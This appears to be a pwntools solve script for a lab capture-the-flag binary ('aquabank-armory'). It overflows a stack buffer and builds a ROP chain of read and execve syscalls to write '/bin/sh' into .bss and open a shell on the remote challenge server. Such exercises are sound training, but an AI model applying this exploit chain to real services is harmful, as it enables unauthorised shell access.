from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13591

context.binary = elf = ELF('/home/kali/Desktop/offsec/ctf/lab3_4_recap/aquabank-armory', checksec=False)
context.arch = 'amd64'


def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ret_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b'weapons:\n')
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.read(core.rsp, 4)
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_RIP = get_ret_offset()

#READ_PLT = elf.plt['read'] it's statically linked so no plt


rop = ROP(elf)      # no PIE so it's fixed like plt and got addr
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

pop_rdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info(f"Found helper gadget 'pop_rdi_ret' function at: {hex(pop_rdi_ret_addr)}")

pop_rsi_ret_addr = rop.find_gadget(['pop rsi', 'ret'])[0]
log.info(f"Found helper gadget 'pop_rsi_ret' function at: {hex(pop_rsi_ret_addr)}")

pop_rdx_ret_addr = rop.find_gadget(['pop rdx', 'ret'])[0]
log.info(f"Found helper gadget 'pop_rdx_ret' function at: {hex(pop_rdx_ret_addr)}")

pop_rax_ret_addr = rop.find_gadget(['pop rax', 'ret'])[0]
log.info(f"Found helper gadget 'pop_rax_ret' function at: {hex(pop_rax_ret_addr)}")

syscall_ret_addr = rop.find_gadget(["syscall", "ret"])[0]
log.info(f"Found helper gadget 'syscall_ret' function at: {hex(syscall_ret_addr)}")

#bin_sh_string_addr = next(elf.search(b'/bin/sh'))    #address of "bin/sh"" -> NOT IN THE FILE

#since no /bin/sh string in the file, i write it to .bss writable region then point to it

bin_sh_string_addr = elf.bss() + 0x100  #any writeble area in .bss

r=conn()
# ROP chain
payload = flat(
    b'A' * OFFSET_TO_RIP,

    # read(0, binsh_addr, 8)
    p64(pop_rax_ret_addr), p64(0),                           # syscall arg 1: syscall number: 0 for read
    p64(pop_rdi_ret_addr), p64(0),                           # syscall arg 2: arg1 of the read. Read from stdin=0
    p64(pop_rsi_ret_addr), p64(bin_sh_string_addr),          # syscall arg 3: arg2 of the read: address where to put the read string: binsh_addr
    p64(pop_rdx_ret_addr), p64(8),                           # syscall arg 4: arg3 of the read: number of bytes to read, 8
    p64(syscall_ret_addr),                                   # syscall(0, 0, binsh_addr, 8)

    # execve("bin/sh", NULL, NULL)
    #p64(elf.sym.ret_gadget),
    p64(pop_rax_ret_addr), p64(59),                         # syscall arg 1: syscall number: 59 for execve
    p64(pop_rdi_ret_addr), p64(bin_sh_string_addr),         # syscall arg 2: arg1 of the execve. In this case the "bin/sh" string, so i pass its address
    p64(pop_rsi_ret_addr), p64(0x0),                        # syscall arg 3: arg2 of the execve: NULL
    p64(pop_rdx_ret_addr), p64(0x0),                        # syscall arg 4: arg3 of the execve: NULL
    p64(syscall_ret_addr),                                  # syscall(SYS_execve, "bin/sh", NULL, NULL);
)

r.recvuntil(b'weapons:\n')
r.send(payload)
r.send(b"/bin/sh\x00")  #after overflow, rop executes read, waiting for 8 bytes, read into binsh_addr
r.interactive()